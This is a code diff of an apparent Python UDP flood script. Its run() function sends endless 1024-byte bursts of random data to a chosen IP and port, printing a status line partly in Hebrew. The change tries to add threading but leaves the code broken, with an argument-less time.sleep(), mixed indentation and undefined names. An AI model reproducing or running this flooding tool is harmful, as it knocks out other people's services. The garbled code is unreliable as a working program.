@@ -1,12 +1,12 @@
 # -*- coding: utf-8 -*-
-import logging
 import random
 import socket
-import threading
 import os
 import sys
+import logging
+import threading
 import time
-import fade
+
 
 # Colors
 class bcolors:
@@ -87,11 +87,14 @@ time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
+	time.sleep()
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-			for x in range(times):
+			x = threading.Thread(target=thread_function, args=(index,) ,  daemon=True)
+                        threads.append(x)
+                        x.start()
 				s.sendto(data,addr)
 			print(i + "\033[35mtcp  \033[32mנשלח באופן אקראי\033[0m")
 		except:
